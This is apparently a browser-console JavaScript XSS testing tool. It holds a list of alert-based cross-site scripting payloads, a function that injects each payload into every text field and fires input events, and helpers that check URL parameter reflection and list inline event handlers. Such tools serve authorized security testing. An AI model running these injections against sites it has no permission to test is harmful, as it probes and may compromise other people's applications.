// ====================================
// XSS Testing & Payload Injector
// ====================================

(function() {
    'use strict';
    
    const commonXSSPayloads = [
        '<script>alert("XSS1")</script>',
        '<img src=x onerror=alert("XSS2")>',
        '<svg/onload=alert("XSS3")>',
        '"><script>alert(String.fromCharCode(88,83,83))</script>',
        '<iframe src="javascript:alert(`XSS5`)">',
        '<input autofocus onfocus=alert("XSS6")>',
        '<select autofocus onfocus=alert("XSS7")>',
        '<textarea autofocus onfocus=alert("XSS8")>',
        '<keygen autofocus onfocus=alert("XSS9")>',
        '<video><source onerror="alert(\'XSS10\')">',
        '<details open ontoggle=alert("XSS11")>',
        '\'><script>alert(String.fromCharCode(88,83,83))</script>',
        '<body onload=alert("XSS12")>',
        '<marquee onstart=alert("XSS13")>',
        'javascript:alert("XSS14")',
        '"><img src=x onerror=alert("XSS15")>',
    ];
    
    /**
     * Test all input fields with XSS payloads
     */
    window.testXSSInputs = function(options = {}) {
        const {
            payloads = commonXSSPayloads,
            autoSubmit = false,
            clearAfter = true
        } = options;
        
        const inputs = document.querySelectorAll('input[type="text"], input[type="search"], textarea, [contenteditable="true"]');
        
        console.group('🎯 XSS Input Testing');
        console.log(`Found ${inputs.length} testable input fields`);
        
        inputs.forEach((input, index) => {
            console.groupCollapsed(`Input ${index + 1}: ${input.tagName} ${input.name || input.id || '(unnamed)'}`);
            
            payloads.forEach((payload, pIndex) => {
                console.log(`Testing payload ${pIndex + 1}:`, payload);
                
                if (input.contentEditable === "true") {
                    input.innerHTML = payload;
                } else {
                    input.value = payload;
                }
                
                // Trigger events
                input.dispatchEvent(new Event('input', { bubbles: true }));
                input.dispatchEvent(new Event('change', { bubbles: true }));
                
                if (clearAfter && pIndex < payloads.length - 1) {
                    setTimeout(() => {
                        input.value = '';
                        input.innerHTML = '';
                    }, 100);
                }
            });
            
            console.groupEnd();
        });
        
        console.groupEnd();
        
        if (autoSubmit) {
            console.warn('⚠️  Auto-submit enabled - forms will be submitted');
            const forms = document.querySelectorAll('form');
            forms.forEach(form => {
                console.log('Submitting form:', form);
                // Uncomment to actually submit:
                // form.submit();
            });
        }
        
        return inputs.length;
    };
    
    /**
     * Test URL parameters for XSS
     */
    window.testURLXSS = function() {
        const params = new URLSearchParams(window.location.search);
        console.group('🔗 URL Parameter XSS Testing');
        
        params.forEach((value, key) => {
            console.log(`Parameter: ${key} = ${value}`);
            console.log('Decoded:', decodeURIComponent(value));
            
            // Check if reflected in DOM
            const bodyText = document.body.innerHTML;
            if (bodyText.includes(value)) {
                console.warn(`⚠️  Parameter "${key}" appears to be reflected in page!`);
            }
        });
        
        console.groupEnd();
    };
    
    /**
     * Find potential XSS sinks in the page
     */
    window.findXSSSinks = function() {
        console.group('🔍 Potential XSS Sinks');
        
        // innerHTML usage
        console.log('Elements that could use innerHTML:', 
            document.querySelectorAll('[data-bind], [data-content], .dynamic-content'));
        
        // Event handlers
        const elementsWithEvents = Array.from(document.querySelectorAll('*'))
            .filter(el => {
                for (let attr of el.attributes) {
                    if (attr.name.startsWith('on')) return true;
                }
                return false;
            });
        console.log('Elements with inline event handlers:', elementsWithEvents);
        
        // Links with javascript: protocol
        const jsLinks = document.querySelectorAll('a[href^="javascript:"]');
        console.log('JavaScript protocol links:', jsLinks);
        
        console.groupEnd();
    };
    
    console.log('✅ XSS Tester loaded!');
    console.log('Commands: testXSSInputs(), testURLXSS(), findXSSSinks()');
})();